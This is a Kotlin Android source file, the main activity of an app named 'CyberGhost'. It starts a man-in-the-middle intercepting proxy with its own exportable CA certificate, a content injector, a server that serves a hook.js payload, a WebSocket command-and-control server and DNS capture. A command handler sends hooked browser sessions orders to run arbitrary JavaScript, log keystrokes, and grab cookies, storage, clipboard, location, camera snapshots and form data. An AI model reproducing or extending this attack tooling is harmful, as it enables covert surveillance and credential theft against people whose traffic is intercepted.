package com.cyberghost

import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.darkColorScheme
import androidx.compose.runtime.*
import androidx.compose.ui.graphics.Color
import com.cyberghost.core.*
import com.cyberghost.ui.*
import kotlinx.coroutines.launch
import android.content.Intent
import android.net.Uri
import androidx.core.content.FileProvider
import java.io.File

private val CyberGhostColors = darkColorScheme(
    background = Color(0xFF080808),
    surface = Color(0xFF111111),
    primary = Color(0xFF00FF41),
    onBackground = Color(0xFFCCCCCC),
    onSurface = Color(0xFFCCCCCC)
)

class MainActivity : ComponentActivity() {

    private var certManager: CertManager? = null
    private var deviceManager: DeviceManager? = null
    private var contentInjector: ContentInjector? = null
    private var proxy: InterceptProxy? = null
    private var c2Server: WebSocketC2Server? = null
    private var mediaServer: MediaServer? = null
    private var dnsCapture: DnsCapture? = null
    private var hookJs: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.i("CG2", "MainActivity onCreate")

        try {
            hookJs = assets.open("hook.js").bufferedReader().readText()
        } catch (e: Exception) {
            Log.e("CG2", "Failed to load hook.js", e)
            hookJs = "// hook.js load failed"
        }

        setContent {
            MaterialTheme(colorScheme = CyberGhostColors) {
                val packets = remember { mutableStateListOf<InterceptedPacket>() }
                val interceptQueue = remember { mutableStateListOf<PendingIntercept>() }
                val devices = remember { mutableStateListOf<ConnectedDevice>() }
                val events = remember { mutableStateListOf<C2Event>() }
                var isRunning by remember { mutableStateOf(false) }
                var mode by remember { mutableStateOf(InterceptMode.PASSTHROUGH) }
                var config by remember { mutableStateOf(InjectionConfig()) }
                var hookedSessions by remember { mutableStateOf<List<HookedSession>>(emptyList()) }

                LaunchedEffect(isRunning) {
                    if (isRunning) {
                        try {
                            if (certManager == null) certManager = CertManager(filesDir)
                            if (deviceManager == null) deviceManager = DeviceManager()
                            if (contentInjector == null) contentInjector = ContentInjector()
                            contentInjector?.config = config

                            proxy = InterceptProxy(8080, certManager!!, contentInjector!!).also { p ->
                                p.mode = mode; p.start()
                                launch {
                                    p.packets.collect { pkt ->
                                        packets.add(pkt); if (packets.size > 2000) packets.removeAt(0)
                                        deviceManager?.trackRequest(pkt.sourceIp, pkt.headers["User-Agent"], pkt.body.size.toLong())
                                    }
                                }
                            }
                            mediaServer = MediaServer(9090, this@MainActivity, hookJs).also { it.start() }
                            c2Server = WebSocketC2Server(9091, deviceManager!!).also { c2 ->
                                c2.start()
                                launch { c2.events.collect { event -> events.add(event); if (events.size > 500) events.removeAt(0) } }
                            }
                            dnsCapture = DnsCapture(5353).also { it.start() }
                            launch {
                                while (true) {
                                    kotlinx.coroutines.delay(500)
                                    deviceManager?.let { dm ->
                                        devices.clear(); devices.addAll(dm.getAllDevices())
                                        hookedSessions = dm.getHookedSessions()
                                    }
                                }
                            }
                            Log.i("CG2", "All engines started")
                        } catch (e: Exception) {
                            Log.e("CG2", "Engine start failed", e)
                            isRunning = false
                        }
                    } else {
                        proxy?.stop(); proxy = null; c2Server?.stop(); c2Server = null
                        mediaServer?.stop(); mediaServer = null; dnsCapture?.stop(); dnsCapture = null
                    }
                }

                LaunchedEffect(mode) { proxy?.mode = mode }
                LaunchedEffect(config) { contentInjector?.config = config }

                LaunchedEffect(isRunning) {
                    if (isRunning) {
                        launch {
                            while (true) {
                                kotlinx.coroutines.delay(200)
                                val current = proxy?.interceptQueue?.toList() ?: emptyList()
                                interceptQueue.clear(); interceptQueue.addAll(current)
                            }
                        }
                    }
                }

                CyberGhostScreen(
                    interceptQueue = interceptQueue, packets = packets, devices = devices,
                    hookedSessions = hookedSessions, mode = mode,
                    isRunning = isRunning, events = events,
                    onModeChange = { mode = it }, onToggle = { isRunning = !isRunning },
                    onForward = { id, pkt -> proxy?.forwardPacket(id, pkt) },
                    onDrop = { id -> proxy?.dropPacket(id) },
                    onCommand = { session, action, params ->
                        when (action) {
                            "exec_js" -> c2Server?.execJs(session, params["code"] as? String ?: "")
                            "screenshot" -> c2Server?.screenshot(session)
                            "keylog_start" -> c2Server?.startKeylog(session)
                            "keylog_stop" -> c2Server?.stopKeylog(session)
                            "get_cookies" -> c2Server?.getCookies(session)
                            "get_storage" -> c2Server?.getStorage(session)
                            "get_clipboard" -> c2Server?.getClipboard(session)
                            "get_location" -> c2Server?.getLocation(session)
                            "camera_snap" -> c2Server?.cameraSnap(session)
                            "form_grab" -> c2Server?.grabForms(session)
                            "get_dom" -> c2Server?.getDom(session)
                        }
                    },
                    onExportCa = { exportCa() }, onConfigUpdate = { config = it }, currentConfig = config
                )
            }
        }
    }

    private fun exportCa() {
        try {
            val pem = certManager?.getCaCertPem() ?: return
            val file = File(cacheDir, "cyberghost_ca.crt")
            file.writeText(pem)
            val uri: Uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
            startActivity(Intent.createChooser(
                Intent(Intent.ACTION_SEND).apply {
                    type = "application/x-x509-ca-cert"
                    putExtra(Intent.EXTRA_STREAM, uri)
                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                }, "Export CyberGhost CA"
            ))
        } catch (e: Exception) {
            Log.e("CG2", "CA export failed", e)
        }
    }

    override fun onDestroy() {
        proxy?.stop(); c2Server?.stop(); mediaServer?.stop(); dnsCapture?.stop(); super.onDestroy()
    }
}
